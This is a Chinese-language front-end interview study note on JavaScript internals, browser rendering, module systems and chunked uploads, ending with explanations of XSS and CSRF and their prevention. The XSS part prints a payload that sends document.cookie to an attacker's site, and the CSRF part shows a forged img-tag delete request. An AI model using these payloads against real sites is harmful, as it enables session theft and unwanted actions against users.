## 如何实现数组的去重

[Array常用的API](https://github.com/karmiy/learn/blob/master/JavaScript/16%E3%80%81Array%E5%B8%B8%E7%94%A8%E7%9A%84API.md) 文章底部

## this 指向如何理解

- 一般情况下，谁调用它，函数里 this 指向就是谁

- 全局环境中 this 指向 window，严格模式下 undefined

- new 构造函数（构造函数不返回 object 或 function）后的实例中，this 指向实例本身

- 可以通过 bind、apply、call 改变this指向，改变不了箭头函数的 this 指向

- 箭头函数本身没有 this，this 指向上下文环境

## 如何实现一个 new

    function _new(constructor, ...args) {
        const target = Object.create(null);
        target.__proto__ = constructor.prototype;

        const result = constructor.apply(target, args);
        if(result && (typeof result === 'object' || typeof result === 'function'))
            return result;
        return target;
    }

    function F(id) {
        this.id = id;
    }

    const f = _new(F, 10);
    =>
    const f = new F(10);

## call、apply、bind 的区别与实现

都是用来改变 this 指向

call 与 apply 会立即执行函数，bind 会返回一个已被改变 this 指向的函数而不会立即执行

call 接收函数的参数以参数位依次排列：fn.call(obj, 1, 2, 3)

apply 接收函数的参数以数组作为第二个参数：fn.call(obj, [1, 2, 3])

bind 与 call 参数相似

实现：

- call 的实现：

````````````
Function.prototype._call = function(context, ...args) {
    context.func = this;
    const result = context.func(...args);
    delete context.func;
    return result;
}
````````````

- apply 的实现：

````````````
Function.prototype._apply = function(context, args) {
    context.func = this;
    const result = args ? context.func(...args) : context.func();
    delete context.func;
    return result;
}
````````````

- bind 的实现：

````````````
Function.prototype._bind = function(context, ...args) {
    context.func = this;
    return function F(...params) {
        let result = null;
        // 被用来 new 的情况
        if(this instanceof F) {
            result = new context.func(...args, ...params);
        } else {
            result = context.func(...args, ...params);
        }
        delete context.func;
        return result;
    }
}
````````````

## 深拷贝与浅拷贝的区别是什么

针对复杂数据类型，浅拷贝只拷贝一层，深拷贝是层层拷贝

浅拷贝是将对象每个属性进行依次拷贝，当对象属性值是引用类型时，拷贝其引用地址不重新生成新引用地址。Object.assign、扩展运算符 ...，Array.prototype.slice、Array.prototype.concat 都是浅拷贝：

    const o1 = {
        id: 1,
    }
    const o2 = {
        list: [1, 2, 3],
    }
    Object.assign(o1, o2); // 合并到 o1 上
    console.log(o1.list === o2.list); // true，浅拷贝 list 属性值

深拷贝对原对象是递归拷贝的，生成的对象与原对象属性值互不影响，如 JSON.parse(JSON.stringify(obj)) 的配合结果就是深拷贝：

    const o1 = {
        list: [1, 2, 3],
    }
    const o2 = JSON.parse(JSON.stringify(o1));
    console.log(o1.list === o2.list); // false

## 如何实现一个深拷贝

- 最简洁实现

最简单实现深拷贝的方法，就是使用 JSON.parse(JSON.stringify(obj))：

    const o1 = {
        list: [1, 2, 3],
    }
    const o2 = JSON.parse(JSON.stringify(o1));
    console.log(o1.list === o2.list); // false

然而这个方法的局限性非常大，如拷贝其他引用类型、函数、循环引用等都存在缺陷

- 基础实现

`````````````
function clone(target) {
    if (typeof target === 'object') {
        let cloneTarget = {};
        for (const key in target) {
            cloneTarget[key] = clone(target[key]);
        }
        return cloneTarget;
    } else {
        return target;
    }
}
`````````````

更深层的写法可以参考：[如何写出一个惊艳面试官的深拷贝](https://juejin.im/post/5d6aa4f96fb9a06b112ad5b1)

## 什么是柯里化，如何实现

函数柯里化是把接收多个参数的函数，转为为一系列使用一个参数的函数的技术：

    fn(1, 2, 3, 4);
    =>
    fn(1)(2)(3)(4);

作用:

- 实现延迟执行

- 参数复用

实现：

    function curry(fn, ...args) {
        return fn.length > args.length ? (...params) => curry(fn, ...args, ...params) : fn(...args);
    }
    function sum(a, b, c) {
        return a + b + c;
    }
    const _sum = curry(sum);
    console.log(_sum(1)(2)(3)); // 6

## 什么是防抖/节流函数，如何实现

防抖函数：控制函数在一定时间内的执行次数，如果这段时间内再次被触发，重新计算延迟时间。一般应用在输入框输入时联系查询，防止用户快速输入导致不断发起请求

节流：控制函数一段时间内只能触发一次。一般用于在执行动画时，控制执行间隔防止触发频率过高

- 防抖函数：

`````````````
function debounce(fn, delay) {
    let timer = null;
    return function(...args) {
        const context = this;
        clearTimeout(timer);
        timer = setTimeout(() => {
            fn.call(context, ...args);
        }, delay);
    }
}
`````````````

- 节流函数：

`````````````
function throttle(fn, delay) {
    let prevTime = Date.now();
    return function(...args) {
        if(Date.now() - prevTime < delay) return;
        
        fn.call(this, ...args);
        prevTime = Date.now();
    }
}
`````````````

## 什么是闭包

内部函数调用外部函数的变量，并持续引用，就是闭包：

    function a() {
        let i = 0;
        return function() {
            console.log(i);
            i++;
        }
    }

    const _a = a();
    _a(); // 0
    _a(); // 1

作用：

- 持续访问函数定义时的变量，如做节流、防抖函数，把原时间、timer 放闭包中持续访问它

- 私有化变量

```````````
function create() {
    let x = 1;
    return {
        getX() {
            return x;
        }
    }
}

const obj = create();
obj.getX(); // 私有化 x，只能调用 getX 访问
```````````

- 模块化独立作用域，如 webpack 模块化编译后都是一个个闭包

```````````
const moduleA = (function() {
    ... 
}());
```````````

- 构建单例

````````````
const createSingle = (function() {
    let single = null;
    return function(id) {
        single = single || Object.create(null);
        single.id = id;
        return single;
    }
}());

const o1 = createSingle(1);
const o2 = createSingle(1);
console.log(o1 === o2); // true
````````````

## 如何实现 flattenDeep 将嵌套数组扁平化

    [1, [2, 3, [4, 5, 6], 7], 8]
    
    =>

    [1, 2, 3, 4, 5, 6, 7, 8]

实现：

    function flattenDeep(arr) {
        return arr.reduce((prevArr, cur) => {
            return prevArr.concat(Array.isArray(cur) ? flattenDeep(cur) : cur);
        }, []);
    }
    const arr = [1, [2, 3, [4, 5, 6], 7], 8];
    console.log(flattenDeep(arr));

## 什么是原型链

每个构造函数都有 prototype 属性获得原型

对象实例也有 \_\_proto\_\_ 属性获得原型 

查找一个对象的属性时，会先从自身找，找不到往上一层原型找，找到则返回，一直到顶层 Object 原型为止，找不到为 undefined

## ES5 如何实现继承

    function A(id) {
        this.id = id;
    }
    A.prototype.name = 'k'

    function B(id) {
        A.call(this, id);
    }

    function F() {}
    F.prototype = A.prototype;
    B.prototype = new F();
    B.prototype.code = '902';

## 浏览器有哪些线程

最前端而言，浏览器主要进程是渲染进程，页面的渲染、JS 执行、事件循环等都在这个进程内执行

**浏览器的渲染进程是多线程的**，它主要包含了如下线程：

- GUI 渲染线程

负责渲染浏览器界面，解析 HTML、CSS，构建 DOM 树 render 树，布局绘制等

界面需要重绘或回流时，该线程会执行

**GUI 渲染线程和 JS 引擎线程是互斥的**，当 JS 引擎执行时 GUI 线程就会挂起，GUI 更新保存在一个队列中等 JS 引擎空闲时立即被执行

- JS 引擎线程

JS 内核，处理 JavaScript 脚本程序，解析并运行代码

**GUI 渲染线程和 JS 引擎线程是互斥的**，所以如果 JS 执行时间过长，就会造成页面渲染不连贯，页面渲染加载阻塞

- 事件触发线程

用来控制事件循环，当 JS 引擎执行代码如 setTimeout，会将对应任务添加到事件线程中

当对应事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待 JS 引擎处理

因为 JS 是单线程，这些待处理队列中的事件都得排队等待 JS 引擎处理，即要等 JS 引擎空闲

- 定时触发器线程

setInterval、setTimeout 所在线程

浏览器定时计数器并不是由 JS 引擎计数（因为 JS 是单线程，若阻塞状态会影响计时准确），因此通过单独线程来计时并触发定时（计时完毕添加到事件队列，等待 JS 引擎空闲执行）

W3C 在 HTML 标准中规定，要求 setTimeout 中低于 4ms 的时间间隔算 4ms

- 异步 http 请求线程

XMLHttpRequest 连接后通过浏览器新开一个线程请求

检测到状态变更时，若设置回调函数，异步线程就**产生状态变更事件**，将这个回调放入事件队列中，由 JS 引擎执行

## 浏览器的渲染流程是什么

- 解析 HTML 建立 DOM

- 解析 CSS 构建 CSSOM

- CSSOM 结合 DOM 合并成 render 树

- 布局 render 树（Layout / reflow），负责各元素尺寸、位置计算

- 绘制 render 树（paint），绘制页面像素信息

- 浏览器将各层的信息发送给 GPU，GPU 会将各层合成，显示在屏幕上

![Alt text](./imgs/js-01.png)

## JS 是否会阻塞页面加载

JS 可以操作 DOM，如果修改这些元素属性同时又渲染页面，那么渲染线程前后获得的元素数据可能不一致

为了防止这种情况，**GUI 渲染线程与 JS 引擎线程是互斥的**，当 JS 引擎执行 GUI 线程就会被挂起，GUI 更新会被保存在一个队列中等待 JS 引擎空闲立即被执行

结论：**JS 会阻塞页面加载**

## CSS 加载是否会阻塞 DOM 树解析

**CSS 是由单独的下载线程异步下载的**

根据浏览器的渲染流程，render 树是由 CSSOM 和 DOM 合并而成，而 CSSOM 和 DOM 解析过程是独立的

结论：**CSS 加载不会阻塞 DOM 树解析**

## CSS 加载是否会阻塞 render 树渲染

根据浏览器的渲染流程，render 树是由 CSSOM 和 DOM 合并而成

所以 render 树需要等待 CSSOM 和 DOM 都完成才能构建

结论：**CSS 加载会阻塞 render 树渲染**

## JS 的加载是否会阻塞 DOM 解析

因为 JS 的脚本可以操作 DOM

所以**每当浏览器遇到脚本标签，DOM 构造就会暂停，整个 DOM 构建过程都将停止，直到脚本执行完**

注意，并不是 \<script> 标签请求完 JS 文件开始执行时才开始停止 DOM 构建，而是一遇到标签就停止，包括请求时。即在网速很慢的情况下，假如请求 js 脚本用了几千毫秒，那么 DOM 构建也会暂停这几千毫秒

所以经常会说把 \<script> 放在 body 下面不要放在 head 中

结论：**JS 的加载会阻塞 DOM 解析**

## CSS 是否会阻塞 JS 执行

因为 JS 可以操作 DOM，也可以操作 CSS 样式

所以样式表会在后面的 JS 执行前先加载执行完毕

结论：**CSS 会阻塞后面 JS 的执行**

## DOMContentLoaded 和 load 的区别

- DOMContentLoaded：仅当 DOM 解析完成后触发，不包括 CSS 样式、图片

- load：页面上所有的 DOM、CSS 样式、脚本、图片等资源都已加载完成后触发

结论：**DOMContentLoaded => load**

注：我们知道 CSS 加载会阻塞 render 树渲染，也可以阻塞后面的 js 执行，js 又会阻塞 DOM 解析，所以可以得知：

- 当文档中没有 JS 脚本时，解析完文档就可以触发 DOMContentLoaded

- 当文档中有 JS 脚本时，JS 会阻塞 DOM 解析，JS 又需要等 CSSOM 解析完才能执行，所以在任何情况下，DOMContentLoaded 的触发不需要等待图片等其他资源加载完成，但是可能会需要等待 CSS 样式解析

## \<script> 标签上 defer 与 async 的区别

![Alt text](./imgs/js-02.png)

- \<script src="script.js">

常规加载，浏览器一遇到 script 标签，就会立即执行并加载，会阻塞文档解析

![Alt text](./imgs/js-03.png)

- \<script async src="script.js">

使用 async，加载 js 与解析、渲染文档会并行执行

js 在加载完毕后执行

js 的执行时间可能在 DOMContentLoaded 之前也可能在之后

![Alt text](./imgs/js-04.png)

![Alt text](./imgs/js-05.png)

- \<script defer src="script.js">

使用 defer，加载 js 与解析、渲染文档会并行执行

当页面解析渲染完成后，会等所有的 defer 脚本加载完毕并按顺序执行，执行完毕后再触发 DOMContentLoaded

**结论：**

- defer、async 在网络读取时都是异步的，不阻碍 HTML 解析

- defer 会在 HTML 解析后才执行脚本，更贴近我们对于应用脚本执行的要求

- defer 执行时会按顺序执行，与加载完毕先后无关，要善于利用

- async 是乱序执行，加载完就会立即执行，所以如果脚本之间有依赖，不要使用 async，一般用在互相不依赖的脚本

## 什么是重绘、回流

- 重绘：页面中元素的样式改变并不影响它在文档流中的位置时（color、background-color、visibility），浏览器将新样式赋予元素并重新绘制它

- 回流：当 render tree 中部分或全部元素的尺寸、结构、或某些属性发生变化时，浏览器重新渲染部分或全部文档的过程。如调用：

```````````
clientWidth、clientHeight、clientTop、clientLeft

offsetWidth、offsetHeight、offsetTop、offsetLeft

scrollWidth、scrollHeight、scrollTop、scrollLeft

scrollIntoView()、scrollIntoViewIfNeeded()

getComputedStyle()

getBoundingClientRect()

scrollTo()
```````````

**对比：**

- 回流的代价比重绘更高，并且有时仅回流一个元素，它的父元素即跟随它的元素也会产生回流，要尽可能避免回流

- 回流一定会引起重绘，重绘不一定会引起回流


**浏览器的措施：**

浏览器会维护一个队列，把所有引起回流和重绘的操作放入，队列中任务数量或时间间隔达到阈值，浏览器会将队列清空，进行一次批处理，这样可以把多次回流和重绘变成一次

当访问以下属性，浏览器会立即清空队列，因为浏览器担心队列里可能会有影响这些属性或方法返回值的操作，为了确保你拿到最精确的值，浏览器会强制清空队列：

    clientWidth、clientHeight、clientTop、clientLef
    
    toffsetWidth、offsetHeight、offsetTop、offsetLefts
    
    crollWidth、scrollHeight、scrollTop、scrollLeft
    
    width、height
    
    getComputedStyle()
    
    getBoundingClientRect()

**如何避免：**

- CSS 中将元素变成 absolute、fixed

- CSS 中避免使用表达式如 calc

- JS 避免频繁操作样式，最好一次性重写 style，或将要改变的样式构建成一个 class 一次性更新元素的 className

- JS 避免频繁操作 DOM，可以创建一个 documentFragment，在它上面应用所有 DOM 操作，再添加到文档上

- JS 频繁元素样式时，可以先设为 display: none，操作结束再设回来，因为 none 时，在元素上进行 DOM 操作不会引发回流和重绘

- JS 避免频繁读取会引发回流、重绘的属性

## 什么是事件循环

- 同步任务在主线程上执行，形成执行栈，异步任务的回调放入任务队列

- 主线程任务执行完，执行栈为空，检查任务队列是否为空，为空继续检查

- 不为空则任务队列一个事件队列，压入执行栈，执行任务

- 执行结束，执行栈为空，重复第 2 步

## 如何实现跨域：

[九种 “姿势” 让你彻底解决跨域问题](https://segmentfault.com/a/1190000016653873)

## CommonJs、AMD、CMD、ES 模块系统差异

目前流行的 js 模块化规范有 CommonJS、AMD、CMD、ES 模块系统

- CommonJS

Node.js是 CommonJS 主要实践者，一个文件就是一个模块，使用 module.exports（或直接 exports） 定义当前模块对外输出接口，required 加载模块：

    // main.js
    var num = 0;
    function add(a, b) {
        return a + b;
    }
    module.exports = {
        add: add,
        num: num
    }

    // app.js
    var math = require('./math');
    math.add(2, 5);

CommonJS 用**同步**的方式加载模块，只有加载完成才能执行后面的操作

在服务端，要加载的模块文件都存在本地磁盘，读取非常快，同步加载是可行的

在浏览器环境，需要从服务器加载模块，这就需要采用异步模块，所以有了 AMD CMD 方案
 
- AMD

AMD 采用异步加载模块，模块的加载不影响后面语句运行

依赖这个模块的语句，都定义在一个回调函数，等加载完成后执行回调

现在主要遵循 AMD 规范的是 RequireJS：使用 require.config() 指定引用路径等，define() 定义模块，require() 加载模块：

    // 页面中引入 require.js、main.js
    <script src="js/require.js" data-main="js/main"></script>

    // main.js 主模块
    require.config({
        baseUrl: "js/lib",
        paths: {
            "jquery": "jquery.min",
            "underscore": "underscore.min",
        }
    });

    // 执行基本操作
    require(["jquery","underscore"],function($,_){
        ...
    }); 

定义的模块也依赖其他模块时：

    // 定义 main.js 模块
    define(function() {
        var num = 0;
        function add(a, b) {
            return a + b;
        }
        return {
            add: add,
            num: num,
        }
    })

    // 定义 b.js 模块，依赖 math 模块
    define(['main.js'], function(math) {
        ...
        return {
            ...
        }
    })

    // 引用
    require(['jquery', 'math'], function($, math) {
        math.add(1, 2);
        ...
    })


AMD 推崇的是依赖前置，提前执行，如 require.js 在申明依赖时会直接加载并执行模块代码：

    define(["jquery","math"],function($, math){
        if(false) {
            // 执行不到这里
            $('#app').animate();
        }
    }); 

上例中，即使根本用不到 jquery，但是我们在 [] 里把它引入了，也会加载并执行它，这样如果引入了多余的模块没有使用，是浪费性能的

- CMD

AMD 推崇的是依赖前置，提前执行，而 CMD 推崇的是依赖就近，延迟执行：

    // AMD 写法
    define(["jquery","math"],function($, math){
        math.add(1, 2);
        if(false) {
            $('#app').animate();
        }
    }); 

    // CMD 写法
    define(function(require, exports, module) {
        var math = require('./math');
        math.add(1, 2);
        if(false) {
            var $ = require('./jquery');
            $('#app').animate();
        }
    })

这样的做法可以看到，之前 AMD 中加载多余模块的问题就可以解决

CMD 规范其实是在 sea.js 推广过程中产生的：

    // sea.js
    // 定义 math.js 模块
    define(function(require, exports, module) {
        var add = function(a,b){
            return a+b;
        }
        exports.add = add;
    })

    // 加载模块
    seajs.use(['main.js'], function(math) {
        var sum = math.add(1, 2);
    })

- ES 模块系统

在 ES6 语音标准层面上实现了模块功能，旨在成为浏览器和服务器通用模块解决方案

主要由两个命令构成：import、export：

    // 定义 math.js 模块
    var num = 0;
    var add = function(a, b) {
        return a + b;
    }

    export {
        num,
        add,
    }

    // 引用模块
    import { num, add } from './math';
    add(1, 2);

也可以使用 export default 命令指定默认导出：

    // main.js
    var add = function(a, b) {
        return a + b;
    }

    export default add;

    // 引用模块
    import add from './math.js';
    add(1, 2);

ES 模块不是对象，import 命令会被 JavaScript 引擎静态分析，**在编译时就引入模块代码，而不是在代码运行时**，所以无法实现条件加载

**ES 模块系统和 CommonJS 差异：**

- CommonJS 输出的是值的拷贝，ES 模块系统输出的是值的引用

- CommonJS 是运行时加载，加载的是个对象，只有在脚本运行时才会生成，而ES 模块系统是编译时输出接口，不是对象，在代码静态编译阶段就会生成

## 如何实现大文件上传和断点续传

学习至 [字节跳动面试官：请你实现一个大文件上传和断点续传](https://juejin.im/post/5dff8a26e51d4558105420ed)

下面只整理思路：

- 大文件上传

前端：

 利用 **Blob.prototype.slice** 方法，将 file 进行切片（如切成 10 片）
 
 循环每一个分片，将每一个切片分别调用接口发送给后端（**并行**发送请求，Promise.all  等待上传结束）
 
每个分片发送结构如下：

    {
        chunk: file 分片
        hash: filename + '-' + index（如：不可描述的视频-1）
        filename: 文件名（不可描述的视频）
    }

 结束后调用接口通知后端合并文件，传递参数：

    {
        filename: 文件名（不可描述的视频）
    }


后端：

接收切片的接口（接收每一个切片，放在定义的文件夹中）

合并请求的接口（接口被调用后合并全部切片为完整文件）

- 显示上传进度条

前端：

各个分片的上传进度：每个切片的请求中，利用 onProgress 监听上传进度

整个文件的上传进度：如果在 Vue 库中，可以利用 computed 实时计算总进度，算法为：当前各个切片已上传 size / 总文件 size，而当前各个切片已上传 size 为该切片 size * 当前该切片进度 percentage

- hash 标识符优化

之前使用的标识符 hash，是 filename + '-' + index（如：不可描述的视频-1），这样文件名一旦修改就失去了效果，而事实上文件内容是不变的，正确的做法是将文件内容作为 hash

可以使用**spark-md5**库，将文件内容计算出 hash，由于考虑大文件计算的性能耗费，为了防止 UI 阻塞，可以使用 Web Worker 单独计算

这样传输的分片就会是如：9bd12088913asc12387f0964-1 的 hash 值

- 文件秒传

做到分片秒传，其实就是已经上传到服务端的资源，当用户再次上传时不再发起请求，直接上传成功

前端：

上传前，利用之前生成的 hash，请求后端判断文件是否已经上传过，若已经上传，直接提示上传成功，不需要发起请求上传文件

后端：

has 值校验文件是否已上传过的校验接口

- 断点续传-暂停上传

前端：

利用 XMLHttpRequest 的 abort 取消请求

- 断点续传-恢复上传

前端：

点击上传或续传时，调用后端接口，获取**该文件已上传的分片名（如 9bd12088913asc12387f0964-1、9bd12088913asc12387f0964-2）**，上传时进行过滤，只上传未上传的部分

后端：

获取已上传分片名列表的接口，可以与之前校验文件是否已上传完成的接口合并

- 进度条回退 BUG

前端：

因为暂停后直接取消请求，导致恢复上传时重新要上传的分片会从 0% 开始，就会出现进度条回退

切片进度条在点击上传或恢复时，需要将已上传的切片进度变为 100%

由于文件进度条是由各个切片进度条计算而来的，在点击上传或恢复时由于部分未上传完成的分片取消变回 0%，导致总文件进度条会倒退。可以用一个变量存储原本总进度条的进度值，当重新恢复上传时，如果计算结果小于存储值，则已存储值来显示

## 如何实现文本溢出省略

[可能是最全的 “文本溢出截断省略” 方案合集](https://juejin.im/post/5dc15b35f265da4d432a3d10)

## get、post 区别

[get、post 区别](https://github.com/karmiy/learn/blob/master/JavaScript/22%E3%80%81ajax%E3%80%81jsonp.md)

- 请求方式

- 缓存

- 数据量

- 安全性

## localStorage、sessionStorage、cookie 区别

[Web Storage与Cookie](https://github.com/karmiy/learn/blob/master/H5/5%E3%80%81input%20file%E3%80%81contenteditable%E3%80%81storage%E7%BC%93%E5%AD%98%E3%80%81Web%20Worker%E3%80%81WebSocket.md)

- 传递

- 有效期

- 存储大小

- 作用域

## 什么是 XSS

XSS：Cross Site Script，跨站脚本攻击

利用恶意脚本对客户端网页进行篡改，从而在用户浏览页面时获取用户隐私数据的一种攻击方式

**分类：**

- 反射型

非持久型 XSS，将用户输入的数据“反射”给浏览器，一般是通过诱导用户去点击一个带有恶意脚本的链接

例如 http://a.jsp?name=k 是一个存在反射型 XSS 漏洞的网站，它的 jsp 页面会取name 参数并直接渲染到页面上

假如如果有人在论坛发了一个这样的链接：

    http://a.jsp?name=<script>document.write("<img src='http://b?key=" + escape(document.cookie) + "'>")</script>

当我们去点击这个链接时，我们在 a 网站的 cookie 就被作为参数发送到了黑客的 b 网站，只要黑客在 b 网站里接收参数 key，就可以拿到你的 cookie，做到 XSS 攻击

- 存储型

持久型 XSS，将用户输入的数据“存储”在服务端（数据库）

一般是出现在发表文章的网站上，黑客发表一个带有恶意脚本的文章，发表后所有访问文章的用户都将执行恶意脚本

例如 http://a.im 网站是一个博客网站，用户可以在上面发表文章，点击提交时，会将 textarea 里的值作为文章的内容发送到服务端，存在数据库中

这时黑客在 textarea 中输入如下信息：

    <div>
        ...
    </div>
    <script>
        alert(document.cookie);
    </script>

然后发表文章，文章 URL 为 http://a.im/article/10001

当每个用户打开这个文章阅读时，就会执行这个恶意脚本，被获取到 cookie 的信息

- Dom Based XSS

通过修改页面 DOM 节点形成 XSS，也是反射型的一种

例如页面 http://a.im?url=XXX 有如下结构：

    const s = location.search.substring(1);
    const url = getParam(s, 'url'); // 从 ?name=XXX 获取值

    document.getElementById("url").innerHTML = "<a href='" + url + "'>link</a>";

如果这时有个链接是：

    http://a.im?url=javascript:alert(document.cookie)

就会执行这个恶意脚本，被获取到 cookie 信息

**预防：**

- HttpOnly

可以看到，经常都会通过 JS 脚本获取 document.cookie 来盗取信息，给 cookie 设置 HttpOnly 属性，让脚本无法读取到 cookie

- 谨慎使用

.innerHTML、.outerHTML、document.write() 等直接输出 DOM 文本要谨慎使用

还有 location、onclick、onerror、onload、onmouseover、a 标签的 href、eval()、setTimeout()、setInterval() 都能将字符串作为代码进行

- 输入检查

检查用户输入的数据是否包含 <、> 等特殊字符，若存在特殊字符可以进行过滤或编码

- 输出检查

后端如使用 JSP 输出 HTML 时，若变量输出在 HTML 上，可以编码或转义

## 什么是 CSRF

CSRF：Cross Site Request Forgery，跨站请求伪造

劫持受信任用户向服务器发送非预期请求的攻击方式

假如有一个博客网站 http://www.c.im

用户**登录**后，可以删除自己的文章，删除时前端会调用接口：

    http://www.c.im/article/delete/:id

而用户在登录时，会设置包含自己身份信息的 cookie，伴随接口调用一起发送给后端

当**用户尚未关闭 c 网站时（或 c 网站 cookie 还未过期）**，他打开了恶意网站 b：

    http:// www.b.im

而 b 网站有如下结构：

    <img src="http://www.c.im/article/delete/10">

这样，当用户打开 b 攻击网站时，就会发起一条 c 网站的删除请求（img 不会有跨域问题），而因为 c 网站的 cookie 依旧在有效期，会跟着这条请求一并被发送，导致用户 id 为 10 的文章就被删除了

这个过程中，攻击者**借助**受害者的 cookie 来骗取服务端的信任，但不能拿到 cookie，也看不到 cookie 内容，只是利用请求携带来修改服务端的数据

**预防：**

- 验证码

被认为是对抗 CSRF 最简洁有效的方法

从示例可以知道，CSRF 攻击是在用户不知情的情况下构造网络请求，攻击者主要利用已知的请求参数，利用受害者的 cookie 来骗取服务端信任，而对未知的东西攻击者也无法模仿，可以利用验证码强制用户进行交互才能完成请求

但是验证码并不能万能的，出于对用户考虑，不可能给所有操作都加上验证码而导致用户体验不佳

- Referer

根据 HTTP 协议，HTTP 头有个字段叫 Referer，记录了 HTTP 请求的来源

可以通过 Referer 检查请求是否来自合法的源，如上例中用户在 c 网站进行删除操作，请求是在 c 网站发起，Referer 为 http://www.c.im，而攻击者是在 b 网站发起的请求，Referer 则会是 http://www.b.im，这样可以根据 Referer 去校验是否是合法请求源

- Token

CSRF 可以攻击成功，是因为攻击者可以伪造请求，用户验证信息是存在 cookie 中的，攻击者可以在不知情这些验证信息的情况下直接利用用户自己的 cookie 通过验证

关键在于在请求中放入攻击者不能伪造的信息

可以在用户登录时，利用用户信息进行加密生成 token 后返回给前端，前端存储后每次请求可以作为参数带上发送给后端，后端再进行解密校验，校验不通过拒绝请求










